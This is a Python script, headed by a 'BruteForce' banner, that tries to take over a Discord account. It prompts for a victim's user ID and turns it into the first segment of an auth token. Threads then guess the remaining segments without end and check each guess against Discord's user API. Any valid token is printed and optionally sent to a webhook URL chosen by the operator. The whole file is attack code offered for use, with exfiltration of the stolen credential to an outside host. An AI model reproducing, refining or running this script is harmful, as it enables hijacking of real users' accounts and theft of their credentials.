import os
import base64
import random
import string
import requests
import json
import threading

BLUE = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"

logo = f"""
          {BLUE}▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████   █████▒▒█████   ██▀███   ▄████▄  ▓█████
         ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
         ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███
         ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
         ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
         ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
         ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
          ░    ░   ░░   ░  ░░░ ░ ░   ░         ░    ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░
          ░         ░        ░                 ░  ░           ░ ░     ░     ░ ░         ░  ░
               ░                                                            ░{RESET}
"""

def brute_force():
    try:
        userid = input(f"\n{BLUE}Victime ID >> {RESET}")
        OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8")
        motifs = ["=", "==", "==="]
        for motif in motifs:
            if OnePartToken.endswith(motif):
                OnePartToken = OnePartToken[:-len(motif)]
        print(f'{BLUE}Part One Token: {OnePartToken}{RESET}')

        brute = input(f"{BLUE}Find the second part by brute force? (y/n) >> {RESET}")
        if brute.lower() not in ['y', 'yes']:
            return

        webhook = input(f"{BLUE}Webhook? (y/n) >> {RESET}")
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f"{BLUE}Webhook URL >> {RESET}")
            print(f"{BLUE}Checking Webhook: {webhook_url}{RESET}")

        try:
            threads_number = int(input(f"{BLUE}Threads Number >> {RESET}"))
        except:
            print(f"{RED}Invalid number{RESET}")
            return

        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': 'WebhookUsername',
                'avatar_url': 'WebhookAvatarURL'
            }
            headers = {'Content-Type': 'application/json'}
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check():
            first = OnePartToken
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
            third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
            token = f"{first}.{second}.{third}"

            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook.lower() == 'y':
                        embed_content = {
                            'title': f'Token Valid !',
                            'description': f"**Token:**\n```{token}```",
                            'color': 0x00FF00,
                            'footer': {"text": 'WebhookUsername', "icon_url": 'WebhookAvatarURL'}
                        }
                        send_webhook(embed_content)
                        print(f"{GREEN}Status: Valid Token: {token}{RESET}")
                    else:
                        print(f"{GREEN}Status: Valid Token: {token}{RESET}")
                else:
                    print(f"{RED}Status: Invalid Token: {token}{RESET}")
            except:
                print(f"{RED}Status: Error Token: {token}{RESET}")

        def request():
            threads = []
            try:
                for _ in range(threads_number):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                print(f"{RED}Invalid number{RESET}")
                return

            for thread in threads:
                thread.join()

        while True:
            request()
    except Exception as e:
        print(f"{RED}[Error] {e}{RESET}")

if __name__ == "__main__":
    print(logo)
    brute_force()
